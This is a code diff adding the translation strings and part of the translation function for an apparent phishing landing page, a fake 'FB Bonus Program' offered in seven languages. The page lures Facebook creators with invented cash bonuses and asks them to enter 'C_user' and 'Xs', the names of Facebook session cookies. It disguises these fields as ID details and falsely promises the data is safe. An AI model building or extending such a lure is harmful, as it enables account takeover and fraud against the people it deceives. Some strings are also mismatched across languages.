+                    step2Btn: 'Completar y Reclamar Bono',
+                    thankyouTitle: '🎉 Anuncios publicados con éxito!',
+                    thankyouP1: '¡Gracias, —! Hemos recibido tu reclamo. Recibirás un correo de confirmación en breve.',
+                    thankyouP2: 'Tu publicidad FB está en camino.',
+                    thankyouBtn: '¡Genial!'
+                },
+                portuguese: {
+                    logoBonus: 'publicidad',
+                    logoProgram: 'Program',
+                    navBenefits: 'Benefícios',
+                    navHow: 'Como Funciona',
+                    navEligibility: 'Elegibilidade',
+                    navJoin: 'Junte-se Agora',
+                    heroBadge: 'Convite Limitado',
+                    heroH1_1: 'Desbloqueie Seu',
+                    heroH1_2: 'Bônus FB',
+                    heroH1_3: 'e Cresça Mais Rápido',
+                    heroP: 'Você foi escolhido para participar do nosso exclusivo Programa de Bônus do Facebook. Ganhe recompensas, aumente o engajamento e escale seu conteúdo como nunca antes.',
+                    heroBtnClaim: 'Reivindique Seu Bônus',
+                    heroBtnLearn: 'Saiba Mais',
+                    stat1Label: 'Total de Bônus Pagos',
+                    stat2Label: 'Membros Ativos',
+                    stat3Label: 'Avaliação dos Membros',
+                    benefitsH2_1: 'Por Que Participar do',
+                    benefitsH2_2: 'Programa FB Bonus',
+                    benefitsH2_3: '?',
+                    benefitsP: 'Benefícios exclusivos projetados para ajudar você a ter sucesso no Facebook.',
+                    bcard1Title: 'Recompensas em Dinheiro',
+                    bcard1Desc: 'Ganhe bônus mensais com base no seu engajamento e alcance.',
+                    bcard2Title: 'Aceleração do Crescimento',
+                    bcard2Desc: 'Obtenha impulsos algorítmicos e suporte prioritário para seu conteúdo.',
+                    bcard3Title: 'Comunidade Exclusiva',
+                    bcard3Desc: 'Conecte-se com os principais criadores e obtenha dicas e estratégias internas.',
+                    bcard4Title: 'Acesso Antecipado',
+                    bcard4Desc: 'Experimente novos recursos do Facebook antes do público em geral.',
+                    howH2_1: 'Como',
+                    howH2_2: 'Funciona',
+                    howP: 'Três passos simples para começar a ganhar seu bônus do Facebook.',
+                    step1Title: 'Candidate-se e Qualifique-se',
+                    step1Desc: 'Envie sua inscrição e seja aprovado em 24 horas.',
+                    step2Title: 'Crie e Engaje',
+                    step2Desc: 'Publique conteúdo e interaja com seu público como de costume.',
+                    step3Title: 'Ganhe e Saque',
+                    step3Desc: 'Receba bônus mensais diretamente no seu método de pagamento preferido.',
+                    eligH2_1: 'Sou',
+                    eligH2_2: 'Elegível',
+                    eligH2_3: '?',
+                    eligP: 'Estamos procurando criadores apaixonados. Aqui está o que verificamos:',
+                    elig1Title: 'Página do Facebook Ativa',
+                    elig1Desc: 'Pelo menos 1.000 seguidores e atividade de postagem consistente.',
+                    elig2Title: 'Conteúdo Original',
+                    elig2Desc: 'Você produz conteúdo autêntico que gera engajamento real.',
+                    elig3Title: 'Diretrizes da Comunidade',
+                    elig3Desc: 'Sua página deve cumprir os padrões da comunidade do Facebook.',
+                    elig4Title: 'Disponibilidade Geográfica',
+                    elig4Desc: 'Aberto a criadores em todas as regiões onde o programa está ativo.',
+                    ctaH2: 'Pronto para Reivindicar Seu Bônus?',
+                    ctaP: 'Junte-se a milhares de criadores que já estão ganhando recompensas. Seu convite está esperando.',
+                    ctaBtn: 'Comece Agora',
+                    footerBonus: 'Bonus',
+                    footerProgram: 'Program',
+                    legalPrivacy: 'Política de Privacidade',
+                    legalTerms: 'Termos de Serviço',
+                    legalContact: 'Contato',
+                    footerCopy: '© 2026 Programa FB Bonus. Todos os direitos reservados. Este é um programa de convite independente e não é afiliado nem endossado pela Meta.',
+                    modalTitle: '🎯 Reivindique ads',
+                    modalSubtitle: 'Preencha os detalhes abaixo para verificar sua elegibilidade.',
+                    infoNotice: '<strong>Por favor, preencha as informações corretas.</strong> Todos os campos são obrigatórios. Seus dados estão seguros e serão usados apenas para verificação do bônus.',
+                    labelCuser: 'C_user',
+                    badgeRequired1: 'obrigatório',
+                    hintCuser: 'Como aparece no seu documento',
+                    labelXs: 'Xs',
+                    badgeRequired2: 'obrigatório',
+                    hintXs: 'Como aparece no seu documento',
+                    step1Btn: 'Enviar Reivindicação',
+                    labelSurname: 'Sobrenome',
+                    badgeRequired3: 'obrigatório',
+                    hintSurname: 'Seu sobrenome conforme perfil do Facebook',
+                    step2Btn: 'Completar e Reivindicar Bônus',
+                    thankyouTitle: '🎉 Anuncios publicados con éxito!',
+                    thankyouP1: 'Obrigado, —! Recebemos sua reivindicação. Você receberá um e-mail de confirmação em breve.',
+                    thankyouP2: 'Seu Bônus FB está a caminho.',
+                    thankyouBtn: 'Ótimo!'
+                },
+                arabic: {
+                    logoBonus: 'ads',
+                    logoProgram: 'Program',
+                    navBenefits: 'المزايا',
+                    navHow: 'كيف يعمل',
+                    navEligibility: 'الأهلية',
+                    navJoin: 'انضم الآن',
+                    heroBadge: 'دعوة محدودة',
+                    heroH1_1: 'افتح',
+                    heroH1_2: 'مكافأة FB',
+                    heroH1_3: 'الخاصة بك وانمو بشكل أسرع',
+                    heroP: 'لقد تم اختيارك للانضمام إلى برنامج مكافآت Facebook الحصري. اربح مكافآت، وزِد التفاعل، وطوّر محتواك كما لم يحدث من قبل.',
+                    heroBtnClaim: 'طالب بمكافأتك',
+                    heroBtnLearn: 'اعرف المزيد',
+                    stat1Label: 'إجمالي المكافآت المدفوعة',
+                    stat2Label: 'الأعضاء النشطون',
+                    stat3Label: 'تقييم الأعضاء',
+                    benefitsH2_1: 'لماذا تنضم إلى',
+                    benefitsH2_2: 'برنامج FB Bonus',
+                    benefitsH2_3: '؟',
+                    benefitsP: 'مزايا حصرية مصممة لمساعدتك على النجاح على Facebook.',
+                    bcard1Title: 'مكافآت نقدية',
+                    bcard1Desc: 'اربح مكافآت شهرية بناءً على تفاعلك ومدى وصولك.',
+                    bcard2Title: 'تسريع النمو',
+                    bcard2Desc: 'احصل على دفعات خوارزمية ودعم ذي أولوية لمحتواك.',
+                    bcard3Title: 'مجتمع حصري',
+                    bcard3Desc: 'تواصل مع أفضل المبدعين واحصل على نصائح واستراتيجيات حصرية.',
+                    bcard4Title: 'وصول مبكر',
+                    bcard4Desc: 'جرّب ميزات Facebook الجديدة قبل عامة الناس.',
+                    howH2_1: 'كيف',
+                    howH2_2: 'يعمل',
+                    howP: 'ثلاث خطوات بسيطة لبدء كسب مكافأة Facebook الخاصة بك.',
+                    step1Title: 'قدّم وتأهل',
+                    step1Desc: 'قدّم طلبك واحصل على الموافقة في غضون 24 ساعة.',
+                    step2Title: 'أنشئ وتفاعل',
+                    step2Desc: 'انشر المحتوى وتفاعل مع جمهورك كالمعتاد.',
+                    step3Title: 'اربح واسحب',
+                    step3Desc: 'استلم مكافآت شهرية مباشرة إلى طريقة الدفع المفضلة لديك.',
+                    eligH2_1: 'هل أنا',
+                    eligH2_2: 'مؤهل',
+                    eligH2_3: '؟',
+                    eligP: 'نحن نبحث عن مبدعين شغوفين. إليك ما نتحقق منه:',
+                    elig1Title: 'صفحة Facebook نشطة',
+                    elig1Desc: 'ما لا يقل عن 1,000 متابع ونشاط نشر مستمر.',
+                    elig2Title: 'محتوى أصلي',
+                    elig2Desc: 'أنت تنتج محتوى أصيلاً يدفع إلى تفاعل حقيقي.',
+                    elig3Title: 'إرشادات المجتمع',
+                    elig3Desc: 'يجب أن تمتثل صفحتك لمعايير المجتمع الخاصة بـ Facebook.',
+                    elig4Title: 'التوفر الجغرافي',
+                    elig4Desc: 'مفتوح للمبدعين في جميع المناطق التي ينشط فيها البرنامج.',
+                    ctaH2: 'هل أنت مستعد للمطالبة بمكافأتك؟',
+                    ctaP: 'انضم إلى آلاف المبدعين الذين يكسبون المكافآت بالفعل. دعوتك في انتظارك.',
+                    ctaBtn: 'ابدأ الآن',
+                    footerBonus: 'Bonus',
+                    footerProgram: 'Program',
+                    legalPrivacy: 'سياسة الخصوصية',
+                    legalTerms: 'شروط الخدمة',
+                    legalContact: 'اتصل بنا',
+                    footerCopy: '© 2026 برنامج FB Bonus. جميع الحقوق محفوظة. هذا برنامج دعوة مستقل وغير تابع أو مدعوم من Meta.',
+                    modalTitle: '🎯 طالب بمكافأتك',
+                    modalSubtitle: 'املأ التفاصيل أدناه للتحقق من أهليتك.',
+                    infoNotice: '<strong>يرجى ملء المعلومات الصحيحة.</strong> جميع الحقول مطلوبة. بياناتك آمنة وستستخدم فقط للتحقق من المكافأة.',
+                    labelCuser: 'C_user',
+                    badgeRequired1: 'مطلوب',
+                    hintCuser: 'كما يظهر في هويتك',
+                    labelXs: 'Xs',
+                    badgeRequired2: 'مطلوب',
+                    hintXs: 'كما يظهر في هويتك',
+                    step1Btn: 'تقديم المطالبة',
+                    labelSurname: 'اللقب',
+                    badgeRequired3: 'مطلوب',
+                    hintSurname: 'لقبك كما هو في ملف Facebook',
+                    step2Btn: 'أكمل وطالب بالمكافأة',
+                    thankyouTitle: '🎉 تمت المطالبة بالمكافأة بنجاح!',
+                    thankyouP1: 'شكراً لك، —! لقد تلقينا مطالبتك. ستتلقى بريداً إلكترونياً للتأكيد قريباً.',
+                    thankyouP2: 'مكافأة FB الخاصة بك في الطريق.',
+                    thankyouBtn: 'رائع!'
+                },
+                french: {
+                    logoBonus: 'Bonus',
+                    logoProgram: 'Program',
+                    navBenefits: 'Avantages',
+                    navHow: 'Fonctionnement',
+                    navEligibility: 'Éligibilité',
+                    navJoin: 'Rejoindre',
+                    heroBadge: 'Invitation Limitée',
+                    heroH1_1: 'Débloquez Votre',
+                    heroH1_2: 'Bonus FB',
+                    heroH1_3: 'et Progressez Plus Vite',
+                    heroP: 'Vous avez été sélectionné pour rejoindre notre programme exclusif de bonus Facebook. Gagnez des récompenses, boostez l\'engagement et développez votre contenu comme jamais auparavant.',
+                    heroBtnClaim: 'Réclamez Votre Bonus',
+                    heroBtnLearn: 'En Savoir Plus',
+                    stat1Label: 'Total des Bonus Versés',
+                    stat2Label: 'Membres Actifs',
+                    stat3Label: 'Note des Membres',
+                    benefitsH2_1: 'Pourquoi Rejoindre le',
+                    benefitsH2_2: 'Programme FB Bonus',
+                    benefitsH2_3: '?',
+                    benefitsP: 'Des avantages exclusifs conçus pour vous aider à réussir sur Facebook.',
+                    bcard1Title: 'Récompenses en Espèces',
+                    bcard1Desc: 'Gagnez des bonus mensuels basés sur votre engagement et votre portée.',
+                    bcard2Title: 'Accélération de la Croissance',
+                    bcard2Desc: 'Bénéficiez de coups de pouce algorithmiques et d\'un support prioritaire pour votre contenu.',
+                    bcard3Title: 'Communauté Exclusive',
+                    bcard3Desc: 'Réseaucez avec les meilleurs créateurs et obtenez des conseils et stratégies d\'initiés.',
+                    bcard4Title: 'Accès Anticipé',
+                    bcard4Desc: 'Essayez les nouvelles fonctionnalités Facebook avant le grand public.',
+                    howH2_1: 'Comment Ça',
+                    howH2_2: 'Marche',
+                    howP: 'Trois étapes simples pour commencer à gagner votre bonus Facebook.',
+                    step1Title: 'Postulez et Qualifiez-vous',
+                    step1Desc: 'Soumettez votre candidature et obtenez l\'approbation sous 24 heures.',
+                    step2Title: 'Créez et Engagez',
+                    step2Desc: 'Publiez du contenu et interagissez avec votre public comme d\'habitude.',
+                    step3Title: 'Gagnez et Retirez',
+                    step3Desc: 'Recevez des bonus mensuels directement sur votre méthode de paiement préférée.',
+                    eligH2_1: 'Suis-Je',
+                    eligH2_2: 'Éligible',
+                    eligH2_3: '?',
+                    eligP: 'Nous recherchons des créateurs passionnés. Voici ce que nous vérifions :',
+                    elig1Title: 'Page Facebook Active',
+                    elig1Desc: 'Au moins 1 000 abonnés et une activité de publication régulière.',
+                    elig2Title: 'Contenu Original',
+                    elig2Desc: 'Vous produisez un contenu authentique qui génère un véritable engagement.',
+                    elig3Title: 'Règles de la Communauté',
+                    elig3Desc: 'Votre page doit respecter les standards de la communauté Facebook.',
+                    elig4Title: 'Disponibilité Géographique',
+                    elig4Desc: 'Ouvert aux créateurs dans toutes les régions où le programme est actif.',
+                    ctaH2: 'Prêt à Réclamer Votre Bonus?',
+                    ctaP: 'Rejoignez des milliers de créateurs qui gagnent déjà des récompenses. Votre invitation vous attend.',
+                    ctaBtn: 'Commencez Maintenant',
+                    footerBonus: 'Bonus',
+                    footerProgram: 'Program',
+                    legalPrivacy: 'Politique de Confidentialité',
+                    legalTerms: 'Conditions d\'Utilisation',
+                    legalContact: 'Contact',
+                    footerCopy: '© 2026 Programme FB Bonus. Tous droits réservés. Ceci est un programme d\'invitation indépendant non affilié ni approuvé par Meta.',
+                    modalTitle: '🎯 Réclamez Votre Bonus',
+                    modalSubtitle: 'Remplissez les détails ci-dessous pour vérifier votre éligibilité.',
+                    infoNotice: '<strong>Veuillez remplir les informations correctes.</strong> Tous les champs sont obligatoires. Vos données sont sécurisées et ne seront utilisées que pour la vérification du bonus.',
+                    labelCuser: 'C_user',
+                    badgeRequired1: 'requis',
+                    hintCuser: 'Tel qu\'il apparaît sur votre pièce d\'identité',
+                    labelXs: 'Xs',
+                    badgeRequired2: 'requis',
+                    hintXs: 'Tel qu\'il apparaît sur votre pièce d\'identité',
+                    step1Btn: 'Soumettre la Réclamation',
+                    labelSurname: 'Nom de famille',
+                    badgeRequired3: 'requis',
+                    hintSurname: 'Votre nom selon le profil Facebook',
+                    step2Btn: 'Terminer et Réclamer le Bonus',
+                    thankyouTitle: '🎉 Bonus Réclamé avec Succès!',
+                    thankyouP1: 'Merci, —! Nous avons reçu votre réclamation. Vous recevrez un e-mail de confirmation sous peu.',
+                    thankyouP2: 'Votre Bonus FB est en route.',
+                    thankyouBtn: 'Super!'
+                },
+                tamil: {
+                    logoBonus: 'Bonus',
+                    logoProgram: 'Program',
+                    navBenefits: 'பலன்கள்',
+                    navHow: 'எப்படி இயங்குகிறது',
+                    navEligibility: 'தகுதி',
+                    navJoin: 'இப்போது இணையுங்கள்',
+                    heroBadge: 'வரையறுக்கப்பட்ட அழைப்பு',
+                    heroH1_1: 'உங்கள்',
+                    heroH1_2: 'FB போனஸை',
+                    heroH1_3: 'திறந்து வேகமாக வளருங்கள்',
+                    heroP: 'எங்கள் பிரத்யேக Facebook போனஸ் திட்டத்தில் இணைய நீங்கள் தேர்ந்தெடுக்கப்பட்டுள்ளீர்கள். வெகுமதிகளைப் பெறுங்கள், ஈடுபாட்டை அதிகரியுங்கள், உங்கள் உள்ளடக்கத்தை முன்பை விட அதிகமாக வளருங்கள்.',
+                    heroBtnClaim: 'உங்கள் போனஸைக் கோருங்கள்',
+                    heroBtnLearn: 'மேலும் அறிக',
+                    stat1Label: 'செலுத்தப்பட்ட மொத்த போனஸ்கள்',
+                    stat2Label: 'செயலில் உள்ள உறுப்பினர்கள்',
+                    stat3Label: 'உறுப்பினர் மதிப்பீடு',
+                    benefitsH2_1: 'ஏன்',
+                    benefitsH2_2: 'FB போனஸ்',
+                    benefitsH2_3: 'திட்டத்தில் இணைய வேண்டும்?',
+                    benefitsP: 'Facebook-இல் வெற்றிபெற உதவும் வகையில் வடிவமைக்கப்பட்ட பிரத்யேக சலுகைகள்.',
+                    bcard1Title: 'பண வெகுமதிகள்',
+                    bcard1Desc: 'உங்கள் ஈடுபாடு மற்றும் சென்றடைதலின் அடிப்படையில் மாதாந்திர போனஸ்களைப் பெறுங்கள்.',
+                    bcard2Title: 'வளர்ச்சி முடுக்கம்',
+                    bcard2Desc: 'உங்கள் உள்ளடக்கத்திற்கான அல்காரிதமிக் ஊக்கங்கள் மற்றும் முன்னுரிமை ஆதரவைப் பெறுங்கள்.',
+                    bcard3Title: 'பிரத்யேக சமூகம்',
+                    bcard3Desc: 'சிறந்த படைப்பாளர்களுடன் இணையுங்கள் மற்றும் உள் குறிப்புகள் & உத்திகளைப் பெறுங்கள்.',
+                    bcard4Title: 'முன்கூட்டிய அணுகல்',
+                    bcard4Desc: 'பொது மக்களுக்கு முன்பே புதிய Facebook அம்சங்களை முயற்சிக்கவும்.',
+                    howH2_1: 'இது எப்படி',
+                    howH2_2: 'இயங்குகிறது',
+                    howP: 'உங்கள் Facebook போனஸைப் பெறத் தொடங்க மூன்று எளிய படிகள்.',
+                    step1Title: 'விண்ணப்பித்துத் தகுதிபெறுங்கள்',
+                    step1Desc: 'உங்கள் விண்ணப்பத்தைச் சமர்ப்பித்து 24 மணி நேரத்தில் ஒப்புதல் பெறுங்கள்.',
+                    step2Title: 'உருவாக்கி ஈடுபடுங்கள்',
+                    step2Desc: 'உள்ளடக்கத்தை வெளியிட்டு வழக்கம் போல் உங்கள் பார்வையாளர்களுடன் தொடர்பு கொள்ளுங்கள்.',
+                    step3Title: 'சம்பாதித்து எடுங்கள்',
+                    step3Desc: 'உங்களுக்கு விருப்பமான பணம் பெறும் முறையில் நேரடியாக மாதாந்திர போனஸ்களைப் பெறுங்கள்.',
+                    eligH2_1: 'நான்',
+                    eligH2_2: 'தகுதியானவனா',
+                    eligH2_3: '?',
+                    eligP: 'நாங்கள் ஆர்வமுள்ள படைப்பாளர்களைத் தேடுகிறோம். நாங்கள் சரிபார்ப்பது இதோ:',
+                    elig1Title: 'செயலில் உள்ள Facebook பக்கம்',
+                    elig1Desc: 'குறைந்தது 1,000 பின்தொடர்பவர்கள் மற்றும் தொடர்ச்சியான பதிவு செயல்பாடு.',
+                    elig2Title: 'அசல் உள்ளடக்கம்',
+                    elig2Desc: 'நீங்கள் உண்மையான ஈடுபாட்டை ஏற்படுத்தும் நம்பகமான உள்ளடக்கத்தை உருவாக்குகிறீர்கள்.',
+                    elig3Title: 'சமூக வழிகாட்டுதல்கள்',
+                    elig3Desc: 'உங்கள் பக்கம் Facebook-இன் சமூகத் தரங்களுக்கு இணங்க வேண்டும்.',
+                    elig4Title: 'புவியியல் கிடைக்கும் தன்மை',
+                    elig4Desc: 'திட்டம் செயலில் உள்ள அனைத்து பகுதிகளிலும் படைப்பாளிகளுக்குத் திறந்தது.',
+                    ctaH2: 'உங்கள் போனஸைக் கோரத் தயாரா?',
+                    ctaP: 'ஏற்கனவே வெகுமதிகளைப் பெறும் ஆயிரக்கணக்கான படைப்பாளர்களுடன் இணையுங்கள். உங்கள் அழைப்பு காத்திருக்கிறது.',
+                    ctaBtn: 'இப்போது தொடங்குங்கள்',
+                    footerBonus: 'Bonus',
+                    footerProgram: 'Program',
+                    legalPrivacy: 'தனியுரிமைக் கொள்கை',
+                    legalTerms: 'சேவை விதிமுறைகள்',
+                    legalContact: 'தொடர்பு',
+                    footerCopy: '© 2026 FB போனஸ் திட்டம். அனைத்து உரிமைகளும் பாதுகாக்கப்பட்டவை. இது ஒரு சுயாதீன அழைப்புத் திட்டம் மற்றும் Meta-வுடன் இணைக்கப்படவோ அங்கீகரிக்கப்படவோ இல்லை.',
+                    modalTitle: '🎯 உங்கள் போனஸைக் கோருங்கள்',
+                    modalSubtitle: 'உங்கள் தகுதியைச் சரிபார்க்க கீழே உள்ள விவரங்களை நிரப்பவும்.',
+                    infoNotice: '<strong>சரியான தகவலை நிரப்பவும்.</strong> அனைத்து புலங்களும் தேவை. உங்கள் தரவு பாதுகாப்பானது மற்றும் போனஸ் சரிபார்ப்புக்கு மட்டுமே பயன்படுத்தப்படும்.',
+                    labelCuser: 'C_user',
+                    badgeRequired1: 'தேவை',
+                    hintCuser: 'உங்கள் அடையாள ஆவணத்தில் உள்ளபடி',
+                    labelXs: 'Xs',
+                    badgeRequired2: 'தேவை',
+                    hintXs: 'உங்கள் அடையாள ஆவணத்தில் உள்ளபடி',
+                    step1Btn: 'கோரிக்கையைச் சமர்ப்பிக்கவும்',
+                    labelSurname: 'குடும்பப்பெயர்',
+                    badgeRequired3: 'தேவை',
+                    hintSurname: 'Facebook சுயவிவரத்தின்படி உங்கள் குடும்பப்பெயர்',
+                    step2Btn: 'முடித்து போனஸைக் கோருங்கள்',
+                    thankyouTitle: '🎉 போனஸ் வெற்றிகரமாக கோரப்பட்டது!',
+                    thankyouP1: 'நன்றி, —! உங்கள் கோரிக்கையைப் பெற்றுள்ளோம். விரைவில் உறுதிப்படுத்தல் மின்னஞ்சலைப் பெறுவீர்கள்.',
+                    thankyouP2: 'உங்கள் FB போனஸ் வரும் வழியில் உள்ளது.',
+                    thankyouBtn: 'அருமை!'
+                },
+                vietnamese: {
+                    logoBonus: 'Bonus',
+                    logoProgram: 'Program',
+                    navBenefits: 'Lợi ích',
+                    navHow: 'Cách Thức',
+                    navEligibility: 'Điều Kiện',
+                    navJoin: 'Tham Gia Ngay',
+                    heroBadge: 'Lời Mời Có Hạn',
+                    heroH1_1: 'Mở Khóa',
+                    heroH1_2: 'Thưởng FB',
+                    heroH1_3: 'của Bạn và Phát Triển Nhanh Hơn',
+                    heroP: 'Bạn đã được chọn để tham gia Chương Trình Thưởng Facebook độc quyền của chúng tôi. Kiếm phần thưởng, tăng tương tác và mở rộng nội dung của bạn hơn bao giờ hết.',
+                    heroBtnClaim: 'Nhận Thưởng Của Bạn',
+                    heroBtnLearn: 'Tìm Hiểu Thêm',
+                    stat1Label: 'Tổng Thưởng Đã Trả',
+                    stat2Label: 'Thành Viên Tích Cực',
+                    stat3Label: 'Đánh Giá Thành Viên',
+                    benefitsH2_1: 'Tại Sao Nên Tham Gia',
+                    benefitsH2_2: 'Chương Trình FB Bonus',
+                    benefitsH2_3: '?',
+                    benefitsP: 'Các đặc quyền độc quyền được thiết kế để giúp bạn thành công trên Facebook.',
+                    bcard1Title: 'Phần Thưởng Tiền Mặt',
+                    bcard1Desc: 'Kiếm thưởng hàng tháng dựa trên mức độ tương tác và phạm vi tiếp cận của bạn.',
+                    bcard2Title: 'Tăng Tốc Phát Triển',
+                    bcard2Desc: 'Nhận hỗ trợ ưu tiên và thúc đẩy thuật toán cho nội dung của bạn.',
+                    bcard3Title: 'Cộng Đồng Độc Quyền',
+                    bcard3Desc: 'Kết nối với những nhà sáng tạo hàng đầu và nhận các mẹo và chiến lược nội bộ.',
+                    bcard4Title: 'Truy Cập Sớm',
+                    bcard4Desc: 'Dùng thử các tính năng Facebook mới trước công chúng.',
+                    howH2_1: 'Cách Thức',
+                    howH2_2: 'Hoạt Động',
+                    howP: 'Ba bước đơn giản để bắt đầu kiếm thưởng Facebook của bạn.',
+                    step1Title: 'Đăng Ký & Đủ Điều Kiện',
+                    step1Desc: 'Gửi đơn đăng ký và được phê duyệt trong vòng 24 giờ.',
+                    step2Title: 'Sáng Tạo & Tương Tác',
+                    step2Desc: 'Xuất bản nội dung và tương tác với khán giả như bình thường.',
+                    step3Title: 'Kiếm Tiền & Rút',
+                    step3Desc: 'Nhận thưởng hàng tháng trực tiếp vào phương thức thanh toán ưa thích của bạn.',
+                    eligH2_1: 'Tôi Có',
+                    eligH2_2: 'Đủ Điều Kiện',
+                    eligH2_3: 'Không?',
+                    eligP: 'Chúng tôi đang tìm kiếm những nhà sáng tạo đam mê. Đây là những gì chúng tôi kiểm tra:',
+                    elig1Title: 'Trang Facebook Đang Hoạt Động',
+                    elig1Desc: 'Ít nhất 1.000 người theo dõi và hoạt động đăng bài thường xuyên.',
+                    elig2Title: 'Nội Dung Gốc',
+                    elig2Desc: 'Bạn sản xuất nội dung xác thực thúc đẩy tương tác thực sự.',
+                    elig3Title: 'Nguyên Tắc Cộng Đồng',
+                    elig3Desc: 'Trang của bạn phải tuân thủ các tiêu chuẩn cộng đồng của Facebook.',
+                    elig4Title: 'Khả Dụng Địa Lý',
+                    elig4Desc: 'Mở cho các nhà sáng tạo ở tất cả các khu vực nơi chương trình đang hoạt động.',
+                    ctaH2: 'Sẵn Sàng Nhận Thưởng Của Bạn?',
+                    ctaP: 'Tham gia cùng hàng ngàn nhà sáng tạo đã kiếm được phần thưởng. Lời mời của bạn đang chờ đợi.',
+                    ctaBtn: 'Bắt Đầu Ngay',
+                    footerBonus: 'Bonus',
+                    footerProgram: 'Program',
+                    legalPrivacy: 'Chính Sách Bảo Mật',
+                    legalTerms: 'Điều Khoản Dịch Vụ',
+                    legalContact: 'Liên Hệ',
+                    footerCopy: '© 2026 Chương Trình FB Bonus. Đã đăng ký bản quyền. Đây là chương trình mời độc lập và không liên kết hoặc được xác nhận bởi Meta.',
+                    modalTitle: '🎯 Nhận Thưởng Của Bạn',
+                    modalSubtitle: 'Điền thông tin chi tiết bên dưới để xác minh điều kiện của bạn.',
+                    infoNotice: '<strong>Vui lòng điền thông tin chính xác.</strong> Tất cả các trường đều bắt buộc. Dữ liệu của bạn được bảo mật và chỉ được sử dụng để xác minh thưởng.',
+                    labelCuser: 'C_user',
+                    badgeRequired1: 'bắt buộc',
+                    hintCuser: 'Như trên giấy tờ tùy thân của bạn',
+                    labelXs: 'Xs',
+                    badgeRequired2: 'bắt buộc',
+                    hintXs: 'Như trên giấy tờ tùy thân của bạn',
+                    step1Btn: 'Gửi Yêu Cầu',
+                    labelSurname: 'Họ',
+                    badgeRequired3: 'bắt buộc',
+                    hintSurname: 'Họ của bạn theo hồ sơ Facebook',
+                    step2Btn: 'Hoàn Thành & Nhận Thưởng',
+                    thankyouTitle: '🎉 Đã Nhận Thưởng Thành Công!',
+                    thankyouP1: 'Cảm ơn bạn, —! Chúng tôi đã nhận được yêu cầu của bạn. Bạn sẽ nhận được email xác nhận sớm.',
+                    thankyouP2: 'Thưởng FB của bạn đang trên đường đến.',
+                    thankyouBtn: 'Tuyệt vời!'
+                },
+                ghanaian: {
+                    logoBonus: 'Bonus',
+                    logoProgram: 'Program',
+                    navBenefits: 'Benefits',
+                    navHow: 'How It Works',
+                    navEligibility: 'Eligibility',
+                    navJoin: 'Join Now',
+                    heroBadge: 'Limited Invitation',
+                    heroH1_1: 'Unlock Your',
+                    heroH1_2: 'FB Bonus',
+                    heroH1_3: '& Grow Faster',
+                    heroP: 'You\'ve been handpicked to join our exclusive Facebook Bonus Program. Earn rewards, boost engagement, and scale your content like never before.',
+                    heroBtnClaim: 'Claim Your Bonus',
+                    heroBtnLearn: 'Learn More',
+                    stat1Label: 'Total Bonuses Paid',
+                    stat2Label: 'Active Members',
+                    stat3Label: 'Member Rating',
+                    benefitsH2_1: 'Why Join the',
+                    benefitsH2_2: 'FB Bonus',
+                    benefitsH2_3: 'Program?',
+                    benefitsP: 'Exclusive perks designed to help you succeed on Facebook.',
+                    bcard1Title: 'Cash Rewards',
+                    bcard1Desc: 'Earn monthly bonuses based on your engagement and reach.',
+                    bcard2Title: 'Growth Acceleration',
+                    bcard2Desc: 'Get algorithmic boosts and priority support for your content.',
+                    bcard3Title: 'Exclusive Community',
+                    bcard3Desc: 'Network with top creators and get insider tips & strategies.',
+                    bcard4Title: 'Early Access',
+                    bcard4Desc: 'Try new Facebook features before the general public.',
+                    howH2_1: 'How It',
+                    howH2_2: 'Works',
+                    howP: 'Three simple steps to start earning your Facebook bonus.',
+                    step1Title: 'Apply & Qualify',
+                    step1Desc: 'Submit your application and get approved within 24 hours.',
+                    step2Title: 'Create & Engage',
+                    step2Desc: 'Publish content and interact with your audience as usual.',
+                    step3Title: 'Earn & Withdraw',
+                    step3Desc: 'Receive monthly bonuses directly to your preferred payout method.',
+                    eligH2_1: 'Am I',
+                    eligH2_2: 'Eligible',
+                    eligH2_3: '?',
+                    eligP: 'We\'re looking for passionate creators. Here\'s what we check:',
+                    elig1Title: 'Active Facebook Page',
+                    elig1Desc: 'At least 1,000 followers and consistent posting activity.',
+                    elig2Title: 'Original Content',
+                    elig2Desc: 'You produce authentic content that drives real engagement.',
+                    elig3Title: 'Community Guidelines',
+                    elig3Desc: 'Your page must comply with Facebook\'s community standards.',
+                    elig4Title: 'Geographic Availability',
+                    elig4Desc: 'Open to creators in all regions where the program is active.',
+                    ctaH2: 'Ready to Claim Your Bonus?',
+                    ctaP: 'Join thousands of creators already earning rewards. Your invitation is waiting.',
+                    ctaBtn: 'Get Started Now',
+                    footerBonus: 'Bonus',
+                    footerProgram: 'Program',
+                    legalPrivacy: 'Privacy Policy',
+                    legalTerms: 'Terms of Service',
+                    legalContact: 'Contact',
+                    footerCopy: '© 2026 FB Bonus Program. All rights reserved. This is an independent invitation program and is not affiliated with or endorsed by Meta.',
+                    modalTitle: '🎯 Claim Your Bonus',
+                    modalSubtitle: 'Fill in the details below to verify your eligibility.',
+                    infoNotice: '<strong>Please fill correct information.</strong> All fields are required. Your data is secure and will only be used for bonus verification.',
+                    labelCuser: 'C_user',
+                    badgeRequired1: 'required',
+                    hintCuser: 'As it appears on your ID',
+                    labelXs: 'Xs',
+                    badgeRequired2: 'required',
+                    hintXs: 'As it appears on your ID',
+                    step1Btn: 'Submit Claim',
+                    labelSurname: 'Surname',
+                    badgeRequired3: 'required',
+                    hintSurname: 'Your surname as per Facebook profile',
+                    step2Btn: 'Complete & Claim Bonus',
+                    thankyouTitle: '🎉 Bonus Claimed Successfully!',
+                    thankyouP1: 'Thank you, —! We\'ve received your claim. You\'ll get a confirmation email shortly.',
+                    thankyouP2: 'Your FB Bonus is on the way.',
+                    thankyouBtn: 'Great!'
+                }
+            };
+
+            let currentLang = 'english';
+
+            // ── Apply translations ──
+            function applyTranslations(lang) {
+                const t = T[lang] || T.english;
+                const txt = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
+                const set = (id, html) => { const el = document.getElementById(id); if (el) el.innerHTML = html; };
+
+                txt('t-logo-bonus', t.logoBonus);
+                txt('t-logo-program', t.logoProgram);
+                txt('t-nav-benefits', t.navBenefits);
+                txt('t-nav-how', t.navHow);
+                txt('t-nav-eligibility', t.navEligibility);
+                txt('t-nav-join', t.navJoin);
+                txt('t-hero-badge', t.heroBadge);
+                txt('t-hero-h1-1', t.heroH1_1);
+                txt('t-hero-h1-2', t.heroH1_2);
+                txt('t-hero-h1-3', t.heroH1_3);
+                txt('t-hero-p', t.heroP);
+                txt('t-hero-btn-claim', t.heroBtnClaim);
+                txt('t-hero-btn-learn', t.heroBtnLearn);
+                txt('t-stat1-label', t.stat1Label);
